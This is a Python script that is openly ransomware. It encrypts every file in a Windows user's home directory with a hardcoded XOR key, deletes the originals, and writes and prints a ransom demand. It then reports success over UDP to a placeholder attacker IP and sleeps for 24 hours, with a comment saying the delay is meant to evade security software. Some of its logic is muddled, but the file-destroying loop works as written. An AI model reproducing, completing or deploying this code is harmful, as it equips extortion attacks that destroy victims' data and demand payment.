import os
import time
from shutil import copyfile
from getpass import getuser
import socket

def encrypt_file(file_path):
    passphrase = b"super_secret_key_1234"
    with open(file_path, 'rb') as source:
        data = source.read()
    encrypted_data = bytes(
        map(lambda x, y: x ^ passphrase[y % len(passphrase)], data, range(len(data)))
    )
    with open(file_path + ".enc", 'wb') as destination:
        destination.write(encrypted_data)

def decrypt_file(file_path):
    with open(file_path, 'rb') as source:
        encrypted_data = source.read()
    passphrase = b"super_secret_key_1234"
    decrypted_data = bytes(
        map(lambda x, y: x ^ passphrase[y % len(passphrase)], encrypted_data, range(len(encrypted_data)))
    )
    with open(file_path.replace(".enc", ""), 'wb') as destination:
        destination.write(decrypted_data)

def encrypt_all_files_in_directory(directory):
    for foldername, subfolders, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            encrypt_file(file_path)
            # Remove the original files to make them inaccessible to the user
            if os.path.exists(file_path.replace(".enc", "")):
                os.remove(file_path.replace(".enc", ""))

def send_message_to_attacker(message):
    # Replace these variables with your attacker's IP and port number
    attacker_ip = "1.2.3.4"
    attacker_port = 54321
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode("utf-8"), (attacker_ip, attacker_port))

def main():
    # Replace "C:/User/YourUserName" with the target's Windows user directory
    directory = r"C:\Users\YourUserName"
    # Ensure the encrypted version of the ransom note is created in the Documents folder
    note_path = r"C:\Users\YourUserName\Documents\ransom_note.txt"
    encrypt_file(note_path)
    # Open a new file for the encrypted ransom note
    with open(note_path.replace(".enc", ".note"), 'w') as note:
        note.write("All of your files have been encrypted! To restore your files, contact [Attacker's email address] and pay the demanded ransom!")
    # Print the ransom message in the console
    print("All of your files have been encrypted! To restore your files, contact [Attacker's email address] and pay the demanded ransom!")
    # Encrypt all the files in the targeted user's directory
    encrypt_all_files_in_directory(directory)
    # Send a message to the attacker about the successful encryption
    message = f"Successfully encrypted files in directory: {directory}\nRansom Note path: {note_path.replace('.', '')}"
    send_message_to_attacker(message)
    # Wait for some time before exiting, this will prevent the program from being immediately detected as ransomware by security software
    time.sleep(60 * 60 * 24)  # Wait for 24 hours

if __name__ == "__main__":
    main()